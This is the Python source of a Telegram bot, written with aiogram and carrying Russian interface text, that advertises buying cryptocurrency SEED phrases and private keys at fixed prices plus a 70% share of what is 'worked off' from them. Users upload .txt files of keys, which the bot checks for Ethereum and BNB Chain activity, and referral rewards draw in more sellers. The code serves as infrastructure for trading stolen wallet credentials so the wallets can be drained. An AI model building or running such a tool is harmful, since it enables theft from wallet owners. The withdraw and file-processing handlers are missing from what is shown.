# main.py
import asyncio
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()

# Клавиатуры
main_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📂 Отправить файл", callback_data="upload")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")],
        [InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
        [InlineKeyboardButton(text="💳 Вывести", callback_data="withdraw")],
        [InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
        [InlineKeyboardButton(text="ℹ️ Правила", callback_data="rules")],
    ]
)

back_menu = InlineKeyboardMarkup(
    inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back")]]
)

@dp.message(CommandStart())
async def start_cmd(message: Message):
    print(f"📩 /start от {message.from_user.id}")
    try:
        args = message.text.split()
        referrer_id = None
        if len(args) > 1 and args[1].startswith("ref_"):
            try:
                referrer_id = int(args[1].replace("ref_", ""))
            except:
                pass

        await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
        if referrer_id and referrer_id != message.from_user.id:
            await register_referral(message.from_user.id, referrer_id)

        ref_link = f"https://t.me/your_bot_username_bot?start=ref_{message.from_user.id}"
        text = (
            "👋 <b>Добро пожаловать!</b>\n\n"
            "🛒 <b>Скупка SEED-фраз и Private-ключей</b> с транзакциями в сетях:\n"
            "• <b>ERC-20 (Ethereum)</b>\n"
            "• <b>BEP-20 (BNB Smart Chain)</b>\n\n"
            "💰 <b>Цены:</b>\n"
            "• 🌱 SEED-фраза — <b>235₽</b>\n"
            "• 🔑 Private-key — <b>145₽</b>\n\n"
            "💸 <b>ПЛАТИМ САМУЮ ВЫСОКУЮ ЦЕНУ</b> + <b>70% от отработки</b> помимо прайса!\n\n"
            "🔝 <b>Наши преимущества:</b>\n"
            "├ 🤖 Автоматизация\n"
            "├ ⚡ Быстрые выплаты\n"
            "├ 🚀 Высокая скорость\n"
            "└ 🔍 Глубокая проверка\n\n"
            "🕒 <b>Выплаты каждый день в 23:00 (МСК)</b>\n"
            "Все заработанные средства будут отправлены автоматически."
        )
        await message.answer(text, reply_markup=main_menu)
    except TelegramForbiddenError:
        pass
    except Exception as e:
        print(f"❌ Ошибка в start: {e}")

# --- КНОПКИ: ВСЕ ОТВЕЧАЮТ СНАЧАЛА, ПОТОМ РЕДАКТИРУЮТ ---

@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    print("📁 Кнопка 'upload' нажата")
    try:
        # ✅ Сначала — ответ
        await callback.answer()

        # Затем — сообщение
        await callback.message.answer(
            "📂 Загрузите файл в формате <b>.txt</b>.\n\n"
            "📌 Поддерживается до <b>20 МБ</b>.\n"
            "🔍 Проверка: уникальность + активность"
        )
        await state.set_state(UploadFile.waiting_file)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            # Если сообщение не изменилось — просто проигнорируем
            pass
        else:
            print(f"❌ Ошибка в upload: {e}")
    except Exception as e:
        print(f"❌ Ошибка в upload: {e}")

@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    print("👤 Кнопка 'profile' нажата")
    try:
        # ✅ Сначала — ответ
        await callback.answer()

        user = await get_user(callback.from_user.id)
        if not user:
            await callback.message.edit_text("❌ Ошибка загрузки профиля.", reply_markup=back_menu)
            return

        text = (
            f"👤 <b>Профиль</b>\n\n"
            f"🆔 ID: <code>{user['user_id']}</code>\n"
            f"📝 Строк: {user['total_lines']}\n"
            f"🌱 SEED: {user['unique_seeds']}\n"
            f"🔑 Keys: {user['unique_keys']}\n"
            f"💰 Заработано: {user['balance']:.2f} RUB"
        )
        await callback.message.edit_text(text, reply_markup=back_menu)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            pass
        else:
            print(f"❌ Ошибка в profile: {e}")
    except Exception as e:
        print(f"❌ Ошибка в profile: {e}")

@dp.callback_query(F.data == "referrals")
async def referrals_cb(callback: CallbackQuery):
    print("👥 Кнопка 'referrals' нажата")
    try:
        await callback.answer()

        ref_count = await get_referral_count(callback.from_user.id)
        earnings = await get_referral_earnings(callback.from_user.id)
        ref_link = f"https://t.me/your_bot_username_bot?start=ref_{callback.from_user.id}"
        text = (
            f"👥 <b>Рефералы</b>\n\n"
            f"🔗 Ссылка: <code>{ref_link}</code>\n"
            f"👥 Приглашено: {ref_count}\n"
            f"💸 Заработано: {earnings:.2f} RUB"
        )
        await callback.message.edit_text(text, reply_markup=back_menu)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            pass
        else:
            print(f"❌ Ошибка в referrals: {e}")
    except Exception as e:
        print(f"❌ Ошибка в referrals: {e}")

@dp.callback_query(F.data == "balance")
async def balance_cb(callback: CallbackQuery):
    print("💰 Кнопка 'balance' нажата")
    try:
        await callback.answer()

        user = await get_user(callback.from_user.id)
        bal = user['balance'] if user else 0.0
        await callback.message.edit_text(f"💰 Баланс: <b>{bal:.2f} RUB</b>", reply_markup=back_menu)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            pass
        else:
            print(f"❌ Ошибка в balance: {e}")
    except Exception as e:
        print(f"❌ Ошибка в balance: {e}")

@dp.callback_query(F.data == "support")
async def support_cb(callback: CallbackQuery, state: FSMContext):
    print("📞 Кнопка 'support' нажата")
    try:
        await callback.answer()

        await callback.message.edit_text(
            "📩 Отправьте сообщение, и админ ответит.\n"
            "Поддерживается: текст, фото, файлы.",
            reply_markup=back_menu
        )
        await state.set_state(SupportState.waiting_for_message)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            pass
        else:
            print(f"❌ Ошибка в support: {e}")
    except Exception as e:
        print(f"❌ Ошибка в support: {e}")

@dp.callback_query(F.data == "rules")
async def rules_cb(callback: CallbackQuery):
    print("📜 Кнопка 'rules' нажата")
    try:
        await callback.answer()

        text = (
            "📜 <b>Правила</b>\n\n"
            "1️⃣ Формат: .txt\n"
            "2️⃣ Только активные кошельки (ETH/BNB)\n"
            "3️⃣ Запрещён обман\n"
            "4️⃣ Выплаты в 23:00 (МСК)"
        )
        await callback.message.edit_text(text, reply_markup=back_menu)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            pass
        else:
            print(f"❌ Ошибка в rules: {e}")
    except Exception as e:
        print(f"❌ Ошибка в rules: {e}")

@dp.callback_query(F.data == "back")
async def back_cb(callback: CallbackQuery):
    print("🔙 Кнопка 'back' нажата")
    try:
        await callback.answer()
        await callback.message.edit_text("Главное меню:", reply_markup=main_menu)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            pass
        else:
            print(f"❌ Ошибка в back: {e}")
    except Exception as e:
        print(f"❌ Ошибка в back: {e}")

# --- Запуск бота с защитой от конфликта polling ---
async def main():
    await init_db()
    print("✅ База данных инициализирована")
    print("🚀 Бот запущен в режиме polling...")
    while True:
        try:
            await dp.start_polling(bot, drop_pending_updates=True)
            break
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
